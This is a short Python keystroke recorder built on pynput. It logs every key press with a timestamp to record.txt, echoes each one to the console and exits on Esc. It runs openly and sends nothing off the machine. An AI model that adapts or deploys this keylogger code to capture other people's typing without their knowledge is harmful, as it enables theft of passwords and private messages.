#Python  :  -3.9-64
#Date    :  14/10/20

# from pynput import keyboard
from pynput.keyboard import Key, Listener
from datetime import datetime
from os import getcwd

def startRecording():
    CWD= getcwd()
    FILEPATH= CWD + "\\record.txt"
    FILE= open(FILEPATH, "w+")
    print(FILEPATH+"\nListening...")
    with Listener(on_press= lambda event: Pressed(event, FILE)) as listener:
        listener.join()

def Pressed(key, FILE):
    now = datetime.now()        

    if key == Key.esc:
        print(f"{now} : Exiting")
        return False

    rcd= f"#{now}: {str(key)}"
    FILE.write(rcd+'\n')
    print(rcd)


if __name__ == '__main__':
    startRecording()

